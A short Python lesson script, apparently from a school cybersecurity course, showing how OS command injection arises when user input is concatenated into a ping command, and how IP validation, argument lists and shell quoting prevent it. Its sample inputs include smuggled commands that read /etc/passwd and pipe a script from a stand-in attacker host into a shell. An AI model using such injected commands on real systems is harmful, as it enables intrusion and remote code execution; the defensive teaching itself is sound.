# 1.2 Injection: SQL, blind SQL, commands, SSRF and paths
# Example "command_injection" from the lesson.
# From the Brainy Bytes Cybersecurity subject. Run it with: python3 <this file>
# Every attack here runs on made up data on your own computer. Never point it at a system you do not own.

# OS command injection: why building a shell command from user input is dangerous. Nothing is executed here,
# the program only shows how a shell would split the text into commands.
import ipaddress, shlex

def as_shell_sees_it(command_text):
    lexer = shlex.shlex(command_text, posix=True, punctuation_chars=";&|")
    commands, current = [], []
    for token in lexer:
        if token in (";", "&&", "||", "|", "&"):
            commands.append(current); current = []
        else:
            current.append(token)
    commands.append(current)
    return [c for c in commands if c]

for user_input in ["8.8.8.8", "8.8.8.8; cat /etc/passwd", "8.8.8.8 && curl evil.io/x.sh | sh"]:
    text = "ping -c 1 " + user_input                       # the bug: string concatenation into a shell
    print(f"input {user_input!r}")
    for i, cmd in enumerate(as_shell_sees_it(text), 1):
        print(f"   command {i}: {cmd}")

# Fix 1: validate strictly against what you expect (an IP address)
def valid_ip(text):
    try:
        ipaddress.ip_address(text)
        return True
    except ValueError:
        return False

# Fix 2: pass an argument list and never use a shell: subprocess.run(["ping", "-c", "1", ip], shell=False)
for user_input in ["8.8.8.8", "8.8.8.8; cat /etc/passwd"]:
    if valid_ip(user_input):
        print("safe argument list:", ["ping", "-c", "1", user_input])
    else:
        print("rejected:", repr(user_input))
print("if a shell is unavoidable, quote:", "ping -c 1 " + shlex.quote("8.8.8.8; cat /etc/passwd"))
